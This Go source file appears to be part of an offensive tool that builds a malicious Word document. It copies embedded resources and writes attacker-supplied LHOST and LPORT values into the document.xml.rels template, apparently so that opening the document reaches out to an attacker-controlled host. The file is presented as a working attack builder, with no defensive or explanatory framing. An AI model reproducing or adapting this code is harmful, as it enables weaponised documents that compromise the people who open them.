package main

import (
	"os"
	"strings"

	"io/fs"
	"path/filepath"
	"text/template"
)

func (opt *options) compile(path string, d fs.DirEntry) error {
	dest := filepath.Join(opt.tmp, "src")
	os.Mkdir(dest, os.ModePerm)

	dest = filepath.Join(dest, strings.Replace(path, "docx", opt.name, -1))
	fdir := filepath.Join("res", path)

	if d.IsDir() {
		os.Mkdir(dest, os.ModePerm)
	} else {
		b, err := fs.ReadFile(res, fdir)
		if err != nil {
			return err
		}

		f, err := os.OpenFile(dest, os.O_WRONLY|os.O_CREATE, os.ModePerm)
		if err != nil {
			return err
		}
		defer f.Close()

		if strings.Contains(path, "document.xml.rels") {
			tpl, err := template.ParseFS(res, fdir)
			if err != nil {
				return err
			}

			data := map[string]interface{}{
				"LHOST": opt.host,
				"LPORT": opt.port,
			}

			err = tpl.Execute(f, data)
			if err != nil {
				return err
			}
		} else {
			_, err = f.Write(b)
			if err != nil {
				return err
			}
		}
	}

	return nil
}
